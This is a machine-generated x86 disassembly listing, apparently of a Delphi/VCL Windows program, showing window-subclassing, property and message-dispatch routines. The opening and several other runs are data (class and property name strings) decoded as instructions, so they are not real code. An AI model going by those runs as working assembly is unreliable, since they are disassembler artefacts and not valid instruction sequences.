or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43963cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4395b4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dh
lea eax [ ebx ]
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
popad
outsb
add ah dh
adc [ eax ] al
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bh
xchg edi eax
inc ebx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp al 0x96
inc ebx
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
jbe r-xdata
add [ eax ] al
xchg esp eax
and al [ ecx ]
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
and al 0x95
inc ebx
add [ eax ] cl
add al cl
xor al 0x40
add [ ebx + esi * 8 ] ah
inc ebx
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
pushfd
rol [ ebx ] 0x1
add al 0x0
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
jo r-xdata
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x68abffc0 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
pop eax
adc [ ecx ] al
cmp al 0x10
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
xchg edi eax
inc ebx
add ah cl
cdq
inc ebx
add [ eax ] al
lea eax [ eax ]
push esp
xchg edi eax
jbe r-xdata
add [ esi + 0x5c004399 ] bh
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
pop eax
adc [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + 0x8004396 ] dh
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc esp
add ah bh
inc ebx
add [ edi + edi - 0x33ffbf ] al
inc ebx
add [ ebx + edx * 8 - 0x2cffffbd ] dl
inc ebx
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add ah al
iretd
add [ eax + edx * 8 + 0x40043 ] bl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_439b1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
fadd [ ebx ]
insb
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
inc ebx
add [ eax + eax ] ah
add [ eax ] al
fmul [ ebx + 0x34b40043 ]
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
add al ah
fwait
jns r-xdata
inc esp
add [ eax ] dl
pushfd
inc ecx
add [ eax ] ch
into
inc ebx
add [ esp + ebx * 4 + 0x41 ] al
add ah dl
into
inc ebx
add [ ebx + ebx * 4 - 0x63d7ffbf ] dl
outsd
jb r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
fcomp [ ebx + 0x3f00041 ]
inc eax
jo r-xdata
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
inc ecx
add [ eax + 0x1 ] bl
add bh bh
sub al 0xd8
inc ebx
add [ edi + edi * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ edx + esi ] al
xor al 0x40
outsd
outsb
je r-xdata
inc ecx
add [ esp + ebx * 4 + 0x41 ] bh
add [ ecx * 8 - 0x5adbffbd ] dl
inc esp
add [ eax + 0x4c0043cd ] cl
movsd [ edi ] [ esi ]
inc esp
add [ eax ] ch
pushfd
js r-xdata
add [ esp + eax ] dl
inc esp
add [ eax ] al
iretd
mov ch cl
inc ebx
add [ ebp + 0x44 ] cl
fwait
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_43a9a0
sub [ ecx - 0x5675ffbd ] 0x43
add [ ecx + ebp * 4 - 0x56faffbd ] dl
inc ebx
add [ 0x150043a9 ] cl
test eax 0xa91d0043
inc ebx
add [ edx ] ch
test eax 0xa9370043
inc ebx
add [ ecx + ebp * 4 + 0x43 ] al
add [ ecx - 0x57 ] dl
inc ebx
add [ esi - 0x57 ] bl
inc ebx
add [ ebx - 0x57 ] ch
inc ebx
add [ eax - 0x57 ] bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffa9a0e870 ] eax
inc ebx
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 4 + 0x43 ] al
add al bl
test eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc esp
test eax 0xa9510043
inc ebx
add [ eax ] bh
add [ eax ] al
xchg esp eax
adc [ eax ] eax
mov ah 0x34
inc eax
add [ eax - 0x4bffbfaa ] ch
push esi
inc eax
add al cl
xor al 0x40
add [ esp + esi + 0x56c40040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
sbb al 0x6d
inc esp
add [ eax + 0x6d ] dh
inc esp
add al ch
outsb
inc esp
add al bh
outsb
inc esp
add [ eax - 0x5fffbb8a ] bh
jns r-xdata
add al cl
stosb [ edi ]
inc ebx
add al ah
jpo r-xdata
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ esp + eax ] ah
inc esp
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
nop
sbb al 0xab
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] ah
add [ eax ] ch
add [ eax ] al
add ah ah
jge r-xdata
inc esp
add [ edi + eax * 2 ] cl
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add [ edx + ebp + 0x40 ] dh
add al ah
xchg esi eax
inc esp
add [ edx + ebp + 0x40 ] dh
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ eax - 0x21 ] bl
inc ebx
add [ ecx ] cl
inc esp
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add [ ebp + edx + 0x18800044 ] al
inc esp
add [ eax + 0x30004416 ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
add [ eax - 0x4bffbff0 ] ah
add al ch
add [ eax + eax - 0x64 ] 0x80
inc esp
add [ ebx + ebp * 2 + 0x7a7c0044 ] dh
inc esp
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax + 0x6a ] dl
cld
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] cl
inc ebx
add [ eax ] cl
add al [ eax ]
add ah ch
popfd
inc ebx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
add eax 0x52100044
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
push es
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
add [ eax ] al
and al 0xac
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
ror [ edi + 0x54060044 ] 0x1
dec ebp
outsd
jne r-xdata
mov eax eax
enter 0x43aa 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x43aa 0x0
sub [ eax ] al
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
add [ eax ] eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov ebx 0xf06afffc
insb
nop
and al 0xac
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax + 0x74 ] al
push ds
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ebp
or [ eax - 0x18 ] dl
insb
sbb al 0xab
inc ebx
add [ eax + 0xb0043a1 ] ah
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
or [ eax - 0x18 ] dl
retn
outsd
insb
jae r-xdata
add [ ebp + 0x108a0040 ] cl
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43ac64
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43ad1c
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43ad50
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40447c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43ad1c
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43adac
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43af90
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c078
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4044dc
mov eax edi
mov edx esi
call sub_404010
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43afd4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c078
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4044dc
mov eax edi
mov edx esi
call sub_404010
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43b018
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43f0c4
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43b094
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
mov eax ebx
call sub_4446f8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43b140
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4139c8
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43b174
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4446f8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43b19c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43b174
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43b140
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41386c
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413a44
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b1f8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4138a0
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4139c8
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_43b22c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4139c8
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43b140
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43b290
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43b2f0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031bc
mov edx esp
mov eax esi
call sub_404220
add esp 0x100
pop esi
pop ebx
retn
sub_43b32c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b3f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43c44c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43bdd4
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406980
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43bdd4
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43c44c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43bdd4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43c44c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43b3fb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43c44c
sub_43b454
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b47e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b4e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b290
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43b510
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403468
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43b53c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403468
xor edx edx
sub_43b594
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_446360
sub_43b5b4
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_446348
sub_43b5d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43b4c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ccb8
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_423670
mov edx eax
mov eax esi
call sub_41ce34
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43b63c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40326c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_43b66c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b4e4
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43b6c8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403468
pop edi
pop esi
pop ebp
retn 0x4
sub_43b6ec
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43b710
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
